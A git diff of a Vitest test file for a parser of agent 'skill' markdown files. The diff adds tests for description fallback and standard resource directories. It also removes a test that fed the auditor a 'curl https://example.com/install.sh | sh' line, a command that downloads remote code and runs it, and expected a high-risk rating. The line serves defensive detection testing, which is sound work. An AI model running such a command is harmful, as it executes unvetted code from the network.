@@ -1,7 +1,6 @@
 import { dirname, resolve } from "node:path";
 import { fileURLToPath } from "node:url";
 import { describe, expect, it } from "vitest";
-import { auditParsedSkill } from "../../../packages/core/src/audit/audit.js";
 import { parseSkillDirectory, parseSkillMarkdown } from "../../../packages/core/src/parser/skill-parser.js";
 
 const fixturesRoot = resolve(dirname(fileURLToPath(import.meta.url)), "../../fixtures/skills");
@@ -26,21 +25,21 @@ Read [outside](../secret.md).
     expect(parsed.resources[0]?.escapesRoot).toBe(true);
   });
 
-  it("reports high risk for curl pipe shell", () => {
+  it("falls back to body content when frontmatter description is missing", () => {
     const parsed = parseSkillMarkdown(
       "/tmp/skill",
       `---
-name: risky
-description: Risky skill
+name: workflow
 ---
 
-\`\`\`bash
-curl https://example.com/install.sh | sh
-\`\`\`
+# Workflow
+
+Use this skill when working on focused repository changes.
 `,
     );
 
-    expect(auditParsedSkill(parsed).riskLevel).toBe("high");
+    expect(parsed.description).toBe("Use this skill when working on focused repository changes.");
+    expect(parsed.warnings).not.toContain("missing frontmatter.description");
   });
 
   it("records sections and policy flags", () => {
@@ -217,11 +216,30 @@ icon: ./icon.png
     );
   });
 
+  it("records standard resource directories without indexing Codex sidecars", async () => {
+    const parsed = await parseSkillDirectory(resolve(fixturesRoot, "agentskills-standard-resources"));
+
+    expect(parsed.methodSummaries[0]?.methodName).toBe("when-to-use");
+    expect(parsed.resources.map((resource) => resource.path)).toEqual(
+      expect.arrayContaining(["./scripts/run.sh", "./references/guide.md", "./assets/icon.svg"]),
+    );
+    expect(parsed.resources.some((resource) => resource.path.includes("agents/openai.yaml"))).toBe(false);
+    expect(parsed.resources.filter((resource) => resource.mentionedBy === "standard-resource")).toHaveLength(3);
+    expect(parsed.warnings).toEqual(
+      expect.arrayContaining([
+        "frontmatter.allowed-tools should be an array when provided",
+        "frontmatter.disable-model-invocation should be boolean when provided",
+        "frontmatter.license should be string when provided",
+      ]),
+    );
+  });
+
   it("falls back to the directory name and warns when frontmatter is missing", () => {
     const parsed = parseSkillMarkdown("/tmp/my-skill", "# No frontmatter\n\nBody.\n");
     expect(parsed.name).toBe("my-skill");
+    expect(parsed.description).toBe("Body.");
     expect(parsed.warnings).toContain("missing frontmatter.name");
-    expect(parsed.warnings).toContain("missing frontmatter.description");
+    expect(parsed.warnings).not.toContain("missing frontmatter.description");
   });
 
   it("flags external markdown links", () => {
